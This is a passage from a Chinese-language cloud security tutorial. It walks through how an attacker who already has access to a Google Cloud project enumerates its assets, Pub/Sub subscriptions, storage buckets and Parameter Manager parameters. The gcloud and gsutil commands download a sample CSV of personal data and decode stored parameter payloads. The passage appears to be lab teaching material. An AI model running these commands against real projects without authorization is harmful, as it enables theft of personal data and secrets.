

这应该启用 Cloud Asset API（`cloudasset.googleapis.com`），自动重试你运行的 `gcloud asset search-all-resources` 命令，并返回项目中所有资产的完整 JSON 列表，包括服务、其位置、状态和父项目信息：

```
Enabling service [cloudasset.googleapis.com] on project [...]...
Operation "operations/..." finished successfully.
[
  ...
  {
    "assetType": "serviceusage.googleapis.com/Service",
    "displayName": "pubsub.googleapis.com",
    "location": "global",
    "name": "//.../services/pubsub.googleapis.com",
    ...
    "state": "ENABLED"
  },
  ...
]
```

## 7. 再次运行之前的命令，但过滤输出以仅显示唯一的 `assetType` 值：

```
gcloud asset search-all-resources \
  --project="$PROJECT_ID" \
  --format="value(assetType)" | sort | uniq
```

这列出了项目中已创建或使用过的唯一 Google Cloud 资产类型：

```
artifactregistry.googleapis.com/DockerImage
artifactregistry.googleapis.com/Repository
cloudbilling.googleapis.com/ProjectBillingInfo
cloudresourcemanager.googleapis.com/Project
dataplex.googleapis.com/EntryGroup
eventarc.googleapis.com/Trigger
...
```

从这里，攻击者将更好地了解哪些服务具有活动或最近活动的资源。

## 8. 让我们探索并检查 Pub/Sub 资源。列出当前项目中的所有 Pub/Sub 主题名称：

```
gcloud pubsub topics list --format="value(name)"
```

这返回 Pub/Sub 主题的名称，该主题的 Eventarc 触发器用于在 HTML 到 PDF 事件驱动工作流中调用 Cloud Run 服务：

```
projects/.../topics/eventarc-us-east1-gcs-trigger-...
```

运行以下命令以检索与 Pub/Sub 主题关联的订阅：

```
TOPIC_NAME=$(gcloud pubsub topics list --format="value(name)")
gcloud pubsub topics list-subscriptions $TOPIC_NAME

SUBSCRIPTION=$(gcloud pubsub topics list-subscriptions "$TOPIC_NAME" \
  --format="value(.)")

echo $SUBSCRIPTION
```

这返回 Pub/Sub 订阅的名称，该订阅的 Eventarc 触发器用于在 HTML 到 PDF 事件驱动工作流中调用 Cloud Run 服务：

```
projects/.../subscriptions/eventarc-us-east1-gcs-trigger-sub-...
```

检查指定 Pub/Sub 订阅的配置详情：

```
gcloud pubsub subscriptions describe $SUBSCRIPTION
```

这返回 Pub/Sub 订阅的完整配置详情：

```
...

name: projects/.../subscriptions/eventarc-us-east1-gcs-trigger-sub-...
pushConfig:
  oidcToken:
    audience: https://html-to-pdf-service-...-ue.a.run.app
    serviceAccountEmail: html-to-pdf@....iam.gserviceaccount.com
  pushEndpoint: https://html-to-pdf-service-....a.run.app?...

...

state: ACTIVE
topic: projects/.../topics/eventarc-us-east1-gcs-trigger-...
```

## 9. 让我们也检查 Cloud Storage 资源以及存储在存储桶中的一些文件。列出项目中的所有 Cloud Storage 存储桶：

```
gcloud storage buckets list --format=json
```

这返回以下内容：

```
[
  ...
  {
    ...
    "storage_url": "gs://ss-another-bucket-.../",
    "uniform_bucket_level_access": false,
    "update_time": "..."
  },
  ...
]
```

列出所有 Cloud Storage 存储桶的名称：

```
gcloud storage buckets list --format="value(name)"
```

这返回以下内容：

```
...
ss-another-bucket-...
ss-input-bucket-...
ss-output-bucket-...
```

检索名称中包含 `another` 的特定存储桶的名称：

```
BUCKET_NAME=$(gcloud storage buckets list --format="value(name)" \
              | grep another)

echo $BUCKET_NAME
```

递归列出指定存储桶中的所有对象：

```
gsutil ls -r "gs://$BUCKET_NAME/**"
```

这返回以下内容：

```
gs://ss-another-bucket-.../cover-photo.png
gs://ss-another-bucket-.../data.csv
```

从指定的 Cloud Storage 存储桶下载 `data.csv` 文件：

```
gsutil cp gs://$BUCKET_NAME/data.csv .
```

显示下载的 CSV 文件的内容：

```
cat data.csv
```

这显示存储在 `data.csv` 文件中的示例记录：

```
First Name,Last Name,Birthdate,Sex,Email,...
Aiko,Tanaka,1991-04-23,Female,aiko.tanaka@example.jp,...
Liam,O'Rourke,1985-12-02,Male,liam.orourke@example.ie,...
Leila,Benali,1990-06-18,Female,leila.benali@example.ma,...
Sven,Larsson,1979-08-30,Male,sven.larsson@example.se,...
Anika,Mehra,1993-02-14,Female,anika.mehra@example.in,...
...
```

`data.csv` 文件充当包含个人身份信息的文件的占位符。在现实世界的入侵中，攻击者可以从云存储存储桶中窃取完整的数据库转储、系统日志或包含机密和凭证的配置文件。

## 10. 让我们探索并检查 Parameter Manager 资源。从 Parameter Manager 检索参数的 JSON 格式列表：

```
gcloud parametermanager parameters list \
  --location=global \
  --format=json
```

这会产生以下输出：

```
[
  {
    "createTime": "...",
    "format": "YAML",
    "name": "projects/.../locations/global/parameters/param-000",
    "policyMember": {
      "iamPolicyUidPrincipal": "..."
    },
    "updateTime": "..."
  }
]
```

检索第一个（也是唯一一个）Parameter Manager 参数的名称并将其存储在 `PARAM_NAME` 变量中：

```
PARAM_NAME=$(gcloud parametermanager parameters list \
  --location=global \
  --limit=1 \
  --format="value(name)")

echo $PARAM_NAME
```

这会产生以下输出：

```
projects/.../locations/global/parameters/param-000
```

列出该参数的所有版本：

```
gcloud parametermanager parameters versions list \
  --location=global \
  --parameter=$PARAM_NAME \
  --format=json
```

这会输出以下内容：

```
[
  {
    "createTime": "2025-00-00T00:00:00.000000000Z",
    "name": "projects/.../.../global/parameters/param-000/versions/2",
    "updateTime": "2025-00-00T00:00:00.000000000Z"
  },
  {
    "createTime": "2025-00-00T00:00:00.000000000Z",
    "name": "projects/.../.../global/parameters/param-000/versions/1",
    "updateTime": "2025-00-00T00:00:00.000000000Z"
  }
]
```

打印参数的版本号：

```
mapfile -t VERSION_NAMES < <(gcloud parametermanager \
  parameters versions list \
  --location=global \
  --parameter="$PARAM_NAME" \
  --format="value(name)")

for VERSION in "${VERSION_NAMES[@]}"; do
    echo "$VERSION"
done
```

这会产生以下输出：

```
projects/.../locations/global/parameters/param-000/versions/2
projects/.../locations/global/parameters/param-000/versions/1
```

检索并解码指定 Parameter Manager 参数每个版本的 data 负载：

```
for VERSION in "${VERSION_NAMES[@]}"; do
    echo "=========="
    echo "$VERSION"
    echo "=========="
    PARAM_DATA=$(gcloud parametermanager parameters \
        versions describe $VERSION \
        --location=global \
        --format="value(payload.data)")

    echo $PARAM_DATA | base64 -d
    echo
    echo "----------"
    echo
done
```
